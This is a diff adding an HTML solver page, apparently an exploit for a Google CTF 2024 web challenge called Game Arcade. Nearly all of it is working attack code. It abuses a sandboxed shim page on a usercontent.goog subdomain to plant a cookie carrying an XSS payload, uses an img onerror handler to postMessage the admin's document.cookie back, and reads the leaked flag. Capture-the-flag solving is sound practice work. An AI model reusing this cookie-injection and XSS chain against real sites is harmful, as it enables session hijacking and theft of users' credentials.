@@ -1,0 +1,44 @@
+<html>
+<meta charset="utf-8">
+<title>Solver|Game Arcade</title>
+
+</html>
+
+<body>
+  <!-- Import crypto functions from the challenge. -->
+  <script src="https://game-arcade-web.2024.ctfcompetition.com/static/safe-frame.js"></script>
+
+  <script>
+    const passwordGameHash = '0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog';
+    const CHALL_URL = 'https://game-arcade-web.2024.ctfcompetition.com/#1';
+    const sleep = d => new Promise(r => setTimeout(r, d));
+    (async function () {
+      const xss = escape(`xss<img src onerror="opener.opener.postMessage({flag:document.cookie}, '*')">`);
+      const exploit = `<script>document.cookie="password=${xss};Domain=${passwordGameHash};Path=/"<\/script>`;
+      const hash = await calculateHash('google-ctf', new ArrayBuffer(0), origin);
+
+      /**
+       * There is a bug that allows to execute on the same site as the password game.
+       * Set an XSS inside a cookie and leak admin's cookie.
+      */
+      const win = open(`http://${hash}-h641507400.${passwordGameHash}/google-ctf/shim.html?origin=${encodeURIComponent(origin)}&cache=1`);
+      await sleep(1000);
+
+      win.postMessage({ body: exploit, mimeType: 'text/html', salt: new ArrayBuffer(0) }, '*');
+
+      open(CHALL_URL);
+      window.onmessage = e => {
+        if (e.data?.flag) {
+          console.log(e.data.flag);
+          location = 'about:blank#' + e.data.flag.split(';')[0];
+        }
+      }
+    })();
+
+
+
+  </script>
+
+</body>
+
+</html>
